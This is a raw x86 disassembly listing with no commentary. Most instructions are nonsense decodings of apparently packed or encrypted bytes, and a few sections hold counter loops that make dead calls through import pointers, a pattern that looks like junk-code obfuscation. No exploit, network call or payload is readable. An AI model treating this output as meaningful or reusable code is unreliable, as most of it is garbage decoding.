  40ee10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee11:	push   edi
  40ee12:	shr    DWORD PTR [edi-0x703e90a5],0xb
  40ee19:	cmp    edi,DWORD PTR [edi-0x60]
  40ee1c:	ret    
  40ee1d:	in     al,dx
  40ee1e:	dec    esi
  40ee1f:	nop
  40ee20:	inc    ecx
  40ee21:	xchg   BYTE PTR [edi],cl
  40ee23:	xchg   esp,eax
  40ee24:	cs jne 0x40ee62
  40ee27:	cmp    DWORD PTR [ebx-0x2d730a42],0x1d
  40ee2e:	xchg   DWORD PTR [eax-0x1c3db422],esi
  40ee34:	mov    ds:0xcda4f454,al
  40ee39:	(bad)  
  40ee3a:	in     eax,0xc
  40ee3c:	inc    eax
  40ee3d:	into   
  40ee3e:	repz in eax,0x85
  40ee41:	jnp    0x40ee66
  40ee43:	mov    edx,0x398d160c
  40ee48:	lods   eax,DWORD PTR ds:[esi]
  40ee49:	into   
  40ee4a:	lahf   
  40ee4b:	dec    esp
  40ee4c:	aam    0x56
  40ee4e:	push   edi
  40ee4f:	pusha  
  40ee50:	xchg   edx,eax
  40ee51:	retf   
  40ee52:	out    dx,eax
  40ee53:	adc    BYTE PTR [ecx-0x4],ah
  40ee56:	push   ebp
  40ee57:	leave  
  40ee58:	(bad)  
  40ee59:	push   ebp
  40ee5a:	ror    edi,cl
  40ee5c:	xchg   ebx,eax
  40ee5d:	retf   
  40ee5e:	jmp    DWORD PTR [ebx+0x21281f2c]
  40ee64:	xlat   BYTE PTR ds:[ebx]
  40ee65:	fld    st(5)
  40ee67:	xchg   edx,edx
  40ee69:	fidiv  DWORD PTR [ecx+eax*8+0xc]
  40ee6d:	dec    esp
  40ee6e:	mov    cl,BYTE PTR [ebp+esi*4+0x34]
  40ee72:	hlt    
  40ee73:	add    al,0x95
  40ee75:	cmp    al,0xdf
  40ee77:	test   BYTE PTR [ecx],0x74
  40ee7a:	and    eax,0xbdf98cd8
  40ee7f:	dec    edi
  40ee80:	(bad)  
  40ee81:	sub    bl,al
  40ee83:	das    
  40ee84:	jns    0x40ee0f
  40ee86:	inc    ebx
  40ee87:	mov    ds:0x9b4487fa,al
  40ee8c:	retf   0x619
  40ee8f:	pop    ebx
  40ee90:	sub    eax,0x8c663a28
  40ee95:	xchg   edx,eax
  40ee96:	add    DWORD PTR [ebx],0xffffffa2
  40ee99:	sub    esp,DWORD PTR [ebx]
  40ee9b:	das    
  40ee9c:	pusha  
  40ee9d:	or     al,0xd4
  40ee9f:	sbb    edx,DWORD PTR [ebx]
  40eea1:	sbb    eax,0xe878fab
  40eea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea7:	or     bh,BYTE PTR [eax+eiz*1-0x21a08f62]
  40eeae:	add    BYTE PTR [edx],0x58
  40eeb1:	fsubrp st(3),st
  40eeb3:	adc    DWORD PTR [ebx],ebp
  40eeb5:	retf   
  40eeb6:	jbe    0x40ef18
  40eeb8:	and    BYTE PTR [esp+edx*4+0x6c00d7e3],bl
  40eebf:	adc    edi,DWORD PTR [esi+0x1a]
  40eec2:	aad    0x5d
  40eec4:	push   ds
  40eec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec6:	mov    edi,edi
  40eec8:	adc    ch,al
  40eeca:	inc    esi
  40eecb:	cmc    
  40eecc:	stos   DWORD PTR es:[edi],eax
  40eecd:	pop    ebp
  40eece:	sub    BYTE PTR [edx-0x13a9e596],bl
  40eed4:	movzx  ebp,BYTE PTR [ecx+0x38fd10b6]
  40eedb:	cmp    DWORD PTR [ecx-0x62],ebx
  40eede:	ror    BYTE PTR [ebx+0x24],1
  40eee1:	mov    ds:0x28f3e895,eax
  40eee6:	in     al,0xaa
  40eee8:	hlt    
  40eee9:	xchg   ebx,eax
  40eeea:	or     al,0x69
  40eeec:	hlt    
  40eeed:	mov    eax,0xd921096c
  40eef2:	rcr    BYTE PTR [edi+ecx*2-0x79],1
  40eef6:	lock xlat BYTE PTR ds:[ebx]
  40eef8:	sub    eax,0xb94e3bec
  40eefd:	xlat   BYTE PTR ds:[ebx]
  40eefe:	fs ins BYTE PTR es:[edi],dx
  40ef00:	scas   eax,DWORD PTR es:[edi]
  40ef01:	mov    BYTE PTR [esi+0x50],bl
  40ef04:	loop   0x40eece
  40ef06:	(bad)  [esi-0x9205f7e]
  40ef0c:	(bad)  [ecx-0x5c6bf48a]
  40ef12:	mov    ebp,0x14fa1219
  40ef17:	in     eax,0xf8
  40ef19:	ret    
  40ef1a:	stos   BYTE PTR es:[edi],al
  40ef1b:	cmp    dl,BYTE PTR [ecx-0x70d11ea8]
  40ef21:	mov    edx,0x68e5fecb
  40ef26:	inc    eax
  40ef27:	and    al,0x54
  40ef29:	ror    DWORD PTR [eax-0x56],cl
  40ef2c:	mov    es,WORD PTR [ecx]
  40ef2e:	adc    dh,ah
  40ef30:	xor    al,0xdb
  40ef32:	pop    esi
  40ef33:	repz jp 0x40ef06
  40ef36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef37:	sar    DWORD PTR [edx-0x98b37c6],cl
  40ef3d:	out    0x2c,eax
  40ef3f:	repz and ecx,edx
  40ef42:	call   0xb9aa:0xef0d180c
  40ef49:	out    0x75,eax
  40ef4b:	ret    0x205b
  40ef4e:	inc    edx
  40ef4f:	jo     0x40ef0b
  40ef51:	je     0x40efc4
  40ef53:	xchg   dl,bh
  40ef55:	sub    eax,0x139368a6
  40ef5a:	push   edi
  40ef5b:	pop    eax
  40ef5c:	outs   dx,DWORD PTR ds:[esi]
  40ef5d:	ret    
  40ef5e:	xor    eax,0x74b3900e
  40ef63:	retf   0x8d2d
  40ef66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef67:	hlt    
  40ef68:	xor    al,0x7e
  40ef6a:	xor    al,bl
  40ef6c:	cs sbb edx,edi
  40ef6f:	dec    edi
  40ef70:	jns    0x40ef40
  40ef72:	loop   0x40ef4b
  40ef74:	or     esp,DWORD PTR fs:[edx+eiz*8]
  40ef78:	sbb    ebx,DWORD PTR [eax-0x13]
  40ef7b:	clc    
  40ef7c:	sti    
  40ef7d:	ror    DWORD PTR [edi+0x4a],cl
  40ef80:	clc    
  40ef81:	push   es
  40ef82:	cmp    esi,DWORD PTR [edi-0x3c]
  40ef85:	jae    0x40efbb
  40ef87:	shl    DWORD PTR [edi],1
  40ef89:	aam    0x68
  40ef8b:	mov    esi,0xc090bbe4
  40ef90:	mov    bh,BYTE PTR [ebx+0x58b3fbe3]
  40ef96:	imul   ecx,DWORD PTR cs:[ebx-0x4cae252b],0x5804a59d
  40efa1:	inc    edi
  40efa2:	xchg   edx,eax
  40efa3:	push   ebp
  40efa4:	sub    ecx,edx
  40efa6:	das    
  40efa7:	shl    dh,0x10
  40efaa:	jnp    0x40efda
  40efac:	add    al,0x4e
  40efae:	xchg   ebp,eax
  40efaf:	pop    ecx
  40efb0:	mov    esi,0xe5be564a
  40efb5:	and    al,0x4a
  40efb7:	pop    edx
  40efb8:	and    ebp,DWORD PTR [ebx-0x5b]
  40efbb:	stc    
  40efbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efbd:	xor    DWORD PTR [ebp+0x5d38d235],ebp
  40efc3:	fmul   DWORD PTR [edx-0x35]
  40efc6:	dec    esi
  40efc7:	mov    gs,WORD PTR [ecx+0x571d1492]
  40efcd:	pop    ss
  40efce:	inc    ebp
  40efcf:	push   ss
  40efd0:	adc    BYTE PTR cs:[ebx+0x45],bl
  40efd4:	push   ebp
  40efd5:	hlt    
  40efd6:	sti    
  40efd7:	mov    edi,0x9e6f6505
  40efdc:	into   
  40efdd:	add    al,0x87
  40efdf:	push   ebx
  40efe0:	stos   DWORD PTR es:[edi],eax
  40efe1:	es cld 
  40efe3:	aam    0x6a
  40efe5:	mov    ah,0x26
  40efe7:	stc    
  40efe8:	adc    eax,0xbe349b19
  40efed:	loope  0x40effa
  40efef:	je     0x40ef93
  40eff1:	scas   al,BYTE PTR es:[edi]
  40eff2:	arpl   dx,dx
  40eff4:	fld    DWORD PTR [edx]
  40eff6:	shr    BYTE PTR [edx+0x7054ca85],0x6e
  40effd:	nop
  40effe:	jbe    0x40eff7
  40f000:	(bad)  
  40f001:	cs or  eax,0xedca2abe
  40f007:	jae    0x40efca
  40f009:	mov    ch,0x8a
  40f00b:	push   ebx
  40f00c:	mov    dh,ah
  40f00e:	mov    al,ds:0x89486d14
  40f013:	mov    edi,0x5589aaa6
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xfb
  40f0d7:	(bad)  
  40f0d8:	sbb    ecx,DWORD PTR [esi+ecx*8-0x1a878744]
  40f0df:	jle    0x40f159
  40f0e1:	js     0x40f087
  40f0e3:	xlat   BYTE PTR ds:[ebx]
  40f0e4:	xchg   ebx,eax
  40f0e5:	je     0x40f0d5
  40f0e7:	sub    DWORD PTR [edx-0x42],0xa1a87e9c
  40f0ee:	inc    edi
  40f0ef:	int3   
  40f0f0:	mov    esi,0x50cb89aa
  40f0f5:	fdiv   st,st(6)
  40f0f7:	cdq    
  40f0f8:	ret    0x8a62
  40f0fb:	(bad)  
  40f0fc:	test   eax,0xbfe96457
  40f101:	mov    al,0x35
  40f103:	lea    eax,[ebx+0x48087f15]
  40f109:	jl     0x40f12d
  40f10b:	xor    ah,BYTE PTR es:[ebp-0x2f]
  40f10f:	mov    cl,0xfb
  40f111:	push   ecx
  40f112:	adc    al,0xfa
  40f114:	xor    edx,0x1c
  40f117:	or     BYTE PTR [esi-0x8],dl
  40f11a:	iret   
  40f11b:	cmp    DWORD PTR [edx+0x34e41956],ebp
  40f121:	and    al,0x2b
  40f123:	fsub   DWORD PTR [edx+0x652a7678]
  40f129:	cmp    eax,0x276fcd0
  40f12e:	mov    cl,BYTE PTR [edx+0x4a9d7925]
  40f134:	adc    DWORD PTR [esi],0xffffff96
  40f137:	pop    edx
  40f138:	fnstcw WORD PTR [edi]
  40f13a:	sbb    esi,edx
  40f13c:	jge    0x40f115
  40f13e:	jle    0x40f183
  40f140:	sub    ebx,ebx
  40f142:	mov    edi,0x9433bb6d
  40f147:	mov    dl,0xee
  40f149:	sub    BYTE PTR [esi+0x23],al
  40f14c:	jl     0x40f16b
  40f14e:	dec    edx
  40f14f:	cmp    ah,al
  40f151:	in     eax,0x5a
  40f153:	push   0xffffffc1
  40f155:	or     al,0x8d
  40f157:	or     eax,0x9c263072
  40f15c:	dec    ebp
  40f15d:	mov    ds:0x775fab10,al
  40f162:	sbb    al,0xed
  40f164:	add    eax,0xeda58071
  40f169:	inc    ebx
  40f16a:	sahf   
  40f16b:	test   al,0x44
  40f16d:	out    0xb7,al
  40f16f:	add    al,0x71
  40f171:	sahf   
  40f172:	test   ch,al
  40f174:	addr16 js 0x40f1b7
  40f177:	mov    esi,0xe16faca5
  40f17c:	lods   al,BYTE PTR ds:[esi]
  40f17d:	pusha  
  40f17e:	imul   bh
  40f180:	pop    esi
  40f181:	dec    edi
  40f182:	addr16 ss inc ebp
  40f185:	xlat   BYTE PTR ds:[ebx]
  40f186:	ds push edi
  40f188:	ret    0x1158
  40f18b:	cmp    edx,0xffffffb6
  40f18e:	push   cs
  40f18f:	add    esi,DWORD PTR [esi+0x53]
  40f192:	and    DWORD PTR es:[ebx+0x412cd11a],0xfffffffb
  40f19a:	cli    
  40f19b:	fmul   DWORD PTR [eax+0x2402cc0a]
  40f1a1:	icebp  
  40f1a2:	push   edi
  40f1a3:	mov    ebx,0x523c1539
  40f1a8:	jbe    0x40f1d4
  40f1aa:	cwde   
  40f1ab:	lock sbb DWORD PTR [eax+0x23],edi
  40f1af:	call   0xc8f:0x31d9a6c7
  40f1b6:	mov    DWORD PTR [edx-0x7a],ebp
  40f1b9:	setl   bh
  40f1bc:	inc    ecx
  40f1bd:	cdq    
  40f1be:	out    0xb7,eax
  40f1c0:	cli    
  40f1c1:	bound  esi,QWORD PTR [esi+ecx*4+0x38]
  40f1c5:	loop   0x40f16b
  40f1c7:	push   eax
  40f1c8:	cmp    bh,BYTE PTR [edi+0x26]
  40f1cb:	fisubr DWORD PTR [ebx]
  40f1cd:	push   es
  40f1ce:	test   ecx,esp
  40f1d0:	cwde   
  40f1d1:	xchg   ebx,eax
  40f1d2:	pop    esp
  40f1d3:	dec    ebx
  40f1d4:	repnz pop edi
  40f1d6:	js     0x40f18e
  40f1d8:	aaa    
  40f1d9:	(bad)  
  40f1da:	pop    edx
  40f1db:	and    eax,0xf54d3d56
  40f1e0:	mov    al,ds:0x916ed9d6
  40f1e5:	out    dx,al
  40f1e6:	into   
  40f1e7:	call   0xb370b649
  40f1ec:	fwait
  40f1ed:	addr16 retf 
  40f1ef:	xor    BYTE PTR [ecx+0x56],ch
  40f1f2:	mov    ch,0x3
  40f1f4:	inc    ebp
  40f1f5:	arpl   WORD PTR [esi-0x1b3ac137],sp
  40f1fb:	mov    edx,0x399440da
  40f200:	iret   
  40f201:	sbb    esi,DWORD PTR [esi-0x2f]
  40f204:	sub    bh,BYTE PTR [ecx-0x2e]
  40f207:	and    BYTE PTR [edi+ecx*8],0x84
  40f20b:	(bad)  
  40f20c:	or     edx,DWORD PTR [edx+ebx*1-0x34]
  40f210:	jmp    0x7487:0x76395b6b
  40f217:	dec    edi
  40f218:	mov    ch,0x89
  40f21a:	adc    eax,0x78994d5
  40f21f:	int    0x6a
  40f221:	repz push es
  40f223:	dec    esi
  40f224:	push   es
  40f225:	sub    al,dh
  40f227:	and    DWORD PTR [ebx+0x528395e7],0x63
  40f22e:	xor    BYTE PTR [eax+0x16fa35d],bh
  40f234:	add    DWORD PTR [eax],0xffffff97
  40f237:	dec    ebx
  40f238:	pop    ebx
  40f239:	test   eax,0x5b71b1af
  40f23e:	das    
  40f23f:	push   cs
  40f240:	popa   
  40f241:	rol    BYTE PTR [edx],1
  40f243:	xor    eax,0x49ddb723
  40f248:	xchg   esp,eax
  40f249:	xor    cl,bl
  40f24b:	jae    0x40f27a
  40f24d:	sbb    edi,esi
  40f24f:	lods   eax,DWORD PTR cs:[esi]
  40f251:	dec    edx
  40f252:	jns    0x40f2c0
  40f254:	call   0x933fd4df
  40f259:	fimul  DWORD PTR [esi+eax*8-0x56]
  40f25d:	outs   dx,BYTE PTR ds:[esi]
  40f25e:	mov    al,BYTE PTR [esi-0x1c2ca68d]
  40f264:	jecxz  0x40f290
  40f266:	fist   WORD PTR [edi-0x47]
  40f269:	adc    BYTE PTR [edx+0x64c074a1],cl
  40f26f:	and    BYTE PTR [ecx+0x41fca75c],0xe5
  40f276:	xchg   eax,ebx
  40f278:	shr    DWORD PTR [esi+0x20],0x1a
  40f27c:	int3   
  40f27d:	adc    ecx,ebp
  40f27f:	imul   ebp,DWORD PTR [ebp+0x18],0x9a262601
  40f286:	stos   BYTE PTR es:[edi],al
  40f287:	cmp    BYTE PTR [ecx-0x18157c7d],cl
  40f28d:	pop    edx
  40f28e:	xchg   ebx,eax
  40f28f:	sti    
  40f290:	addr16 pop ebx
  40f292:	fadd   DWORD PTR [ebp+0x19]
  40f295:	push   cs
  40f296:	mov    esi,ecx
  40f298:	mov    esi,0x4bb2a937
  40f29d:	xor    eax,0x39b3769d
  40f2a2:	sbb    al,0xc
  40f2a4:	sbb    bh,BYTE PTR [edx]
  40f2a6:	loop   0x40f2bc
  40f2a8:	push   edx
  40f2a9:	dec    edx
  40f2aa:	mov    dl,0xce
  40f2ac:	xor    al,0x8c
  40f2ae:	xor    ebp,edx
  40f2b0:	xor    eax,0xb14c3907
  40f2b5:	stos   DWORD PTR es:[edi],eax
  40f2b6:	xor    ebp,ecx
  40f2b8:	mov    edi,0x8b5a5440
  40f2bd:	mov    ds:0x7e961541,al
  40f2c3:	popf   
  40f2c4:	stos   BYTE PTR es:[edi],al
  40f2c5:	sbb    eax,eax
  40f2c7:	sub    ebx,DWORD PTR [edi-0x2ce2d94f]
  40f2cd:	add    ebp,DWORD PTR fs:[ecx-0x6c4bce91]
  40f2d4:	jl     0x40f25c
  40f2d6:	ret    0x984b
  40f2d9:	pop    ebx
  40f2da:	adc    al,0x5f
  40f2dc:	addr16 sbb eax,ebx
  40f2df:	jae    0x40f2bf
  40f2e1:	test   DWORD PTR [esp+0x45498c9a],0xd756afca
  40f2ec:	fimul  DWORD PTR [edx]
  40f2ee:	jp     0x40f275
  40f2f0:	push   ds
  40f2f1:	leave  
  40f2f2:	ins    BYTE PTR es:[edi],dx
  40f2f3:	call   0x64795104
  40f2f8:	adc    DWORD PTR [eax],edx
  40f2fa:	cmp    ch,BYTE PTR [eax-0x5]
  40f2fd:	jmp    0x40f2fb
  40f2ff:	mov    al,al
  40f301:	push   edi
  40f302:	cmp    BYTE PTR [ecx],ch
  40f304:	and    al,0x14
  40f306:	mov    al,ds:0x3c9f0d3f
  40f30b:	jl     0x40f335
  40f30d:	or     BYTE PTR [ebx],dh
  40f30f:	fwait
  40f310:	mov    DWORD PTR [esi+0x49],ebx
  40f313:	loop   0x40f2e6
  40f315:	xchg   ebx,eax
  40f316:	aaa    
  40f317:	inc    esi
  40f318:	stc    
  40f319:	iret   
  40f31a:	dec    edi
  40f31b:	and    dh,0x95
  40f31e:	bound  ebx,QWORD PTR [ebp+ebx*1+0x463216f4]
  40f325:	dec    esi
  40f326:	jmp    0x7a03:0x3ce98106
  40f32d:	outs   dx,DWORD PTR ds:[esi]
  40f32e:	jne    0x40f327
  40f330:	sbb    al,al
  40f332:	xchg   edx,eax
  40f333:	pop    ebp
  40f334:	xchg   esi,eax
  40f335:	push   edx
  40f336:	sub    cl,ah
  40f338:	add    BYTE PTR [ebx-0xa35b73b],bl
  40f33e:	pushf  
  40f33f:	jmp    0x26d30285
  40f344:	xchg   ecx,eax
  40f345:	pop    esp
  40f346:	mov    ds:0xb49d933,al
  40f34b:	pop    esp
  40f34c:	out    0x3,eax
  40f34e:	rol    edi,1
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	sar    DWORD PTR [edx],0x36
  40f573:	pop    esp
  40f574:	dec    eax
  40f575:	mov    ebx,0xe5787842
  40f57a:	jle    0x40f5f4
  40f57c:	js     0x40f4fe
  40f57e:	jae    0x40f58b
  40f580:	push   ecx
  40f581:	mov    ebp,0x9ce344bf
  40f586:	ss in  al,0xe
  40f589:	fs jge 0x40f55c
  40f58c:	push   cs
  40f58d:	inc    ebx
  40f58e:	push   edi
  40f58f:	leave  
  40f590:	dec    ecx
  40f591:	mov    cl,0x2e
  40f593:	or     ebp,DWORD PTR [ecx-0x1b]
  40f596:	pushw  ss
  40f598:	pop    es
  40f599:	push   ecx
  40f59a:	or     ecx,DWORD PTR [edi]
  40f59c:	fld    DWORD PTR [edi]
  40f59e:	imul   ebx,edx,0x5f60ca40
  40f5a4:	jmp    0xbff1c088
  40f5a9:	idiv   DWORD PTR [ebp+0x5fc0b038]
  40f5af:	jmp    0x40f539
  40f5b1:	scas   al,BYTE PTR es:[edi]
  40f5b2:	or     edi,DWORD PTR [esp+ecx*4-0x7d]
  40f5b6:	cmp    edx,eax
  40f5b8:	xor    BYTE PTR [ebx-0x36],dl
  40f5bb:	dec    eax
  40f5bc:	pop    ecx
  40f5bd:	retf   0xb33d
  40f5c0:	mov    ds:0xfefdf9f3,eax
  40f5c5:	inc    esi
  40f5c6:	dec    ecx
  40f5c7:	push   ds
  40f5c8:	mov    ch,0xc9
  40f5ca:	fld    TBYTE PTR [ecx]
  40f5cc:	idiv   esp
  40f5ce:	es (bad) 
  40f5d0:	jmp    0x40f61a
  40f5d2:	push   ss
  40f5d3:	ins    BYTE PTR es:[edi],dx
  40f5d4:	cmp    eax,DWORD PTR [edi+0x0]
  40f5d7:	lahf   
  40f5d8:	ds call 0x6fdc:0x50ac793d
  40f5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e1:	sahf   
  40f5e2:	das    
  40f5e3:	cmp    DWORD PTR [ecx-0x7d600681],edi
  40f5e9:	push   ebp
  40f5ea:	arpl   WORD PTR [ecx+0x23385240],bp
  40f5f0:	in     eax,dx
  40f5f1:	sar    BYTE PTR [ecx+0x4e],cl
  40f5f4:	cmp    bh,dh
  40f5f6:	das    
  40f5f7:	xchg   DWORD PTR [ebx],ebx
  40f5f9:	aaa    
  40f5fa:	add    eax,0xb82d8d18
  40f5ff:	ror    BYTE PTR [edx+0x62],0xcb
  40f603:	mov    dl,0xce
  40f605:	fild   DWORD PTR [ebp+0x3e5ed321]
  40f60b:	test   BYTE PTR [eax+0x1893716e],ch
  40f611:	mov    al,ds:0x93fa61cf
  40f616:	push   0xa535de6f
  40f61b:	and    eax,DWORD PTR [ecx+0x6d8513f2]
  40f621:	gs mov ss,esi
  40f624:	stos   BYTE PTR es:[edi],al
  40f625:	cli    
  40f626:	shl    al,1
  40f628:	xor    al,0x72
  40f62a:	pop    ss
  40f62b:	(bad)  
  40f62c:	mov    cl,0x53
  40f62e:	mov    ebp,0x1a8f95a6
  40f633:	add    BYTE PTR [esi+0x26],cl
  40f636:	mov    bl,dh
  40f638:	push   eax
  40f639:	xor    bh,BYTE PTR [edi+0x32ccc98e]
  40f63f:	inc    esp
  40f640:	adc    DWORD PTR [eax+0x4f12acb4],0x261bb832
  40f64a:	shr    DWORD PTR [ebp+eax*1-0x64027389],0x37
  40f652:	leave  
  40f653:	mov    ebp,0x420588b1
  40f658:	mov    ah,0xd5
  40f65a:	sbb    BYTE PTR [edi],ah
  40f65c:	add    cl,dh
  40f65e:	mov    WORD PTR [ebx+0x3a5ce629],fs
  40f664:	mov    bh,BYTE PTR [eax+esi*4+0x38]
  40f668:	sub    DWORD PTR [edx-0x2a],esp
  40f66b:	add    BYTE PTR [ecx-0x44],dl
  40f66e:	add    esp,DWORD PTR [si-0x3e]
  40f672:	xor    ecx,eax
  40f674:	in     eax,dx
  40f675:	jge    0x40f690
  40f677:	imul   ebp,DWORD PTR ds:0x3bbacdf6,0xaeb870da
  40f681:	jmp    0x40f608
  40f683:	outs   dx,DWORD PTR ds:[esi]
  40f684:	out    0x58,eax
  40f686:	jns    0x40f6e0
  40f688:	das    
  40f689:	mov    ebx,0x45ecacb9
  40f68e:	mov    edi,0xbc20ccaa
  40f693:	add    dh,BYTE PTR [ecx-0x3]
  40f696:	or     edi,DWORD PTR [ebx+eax*2-0x26874b19]
  40f69d:	adc    eax,0x8248ba0b
  40f6a2:	leave  
  40f6a3:	cmp    BYTE PTR [ecx],al
  40f6a5:	test   ecx,eax
  40f6a7:	std    
  40f6a8:	mov    ah,0x4f
  40f6aa:	cmp    DWORD PTR [eax+0x6d95abc9],0xffffffcb
  40f6b1:	jmp    0x56e:0x8867c07c
  40f6b8:	aam    0xb2
  40f6ba:	mov    ah,0xd1
  40f6bc:	ins    BYTE PTR es:[edi],dx
  40f6bd:	jp     0x40f67b
  40f6bf:	out    dx,eax
  40f6c0:	and    eax,DWORD PTR [ecx]
  40f6c2:	fsubr  QWORD PTR [esi-0x29]
  40f6c5:	std    
  40f6c6:	cmp    eax,0x6f21190e
  40f6cb:	loopne 0x40f738
  40f6cd:	outs   dx,DWORD PTR ds:[esi]
  40f6ce:	cmp    dh,BYTE PTR [ebp+0x474f8f63]
  40f6d4:	add    ebp,ebx
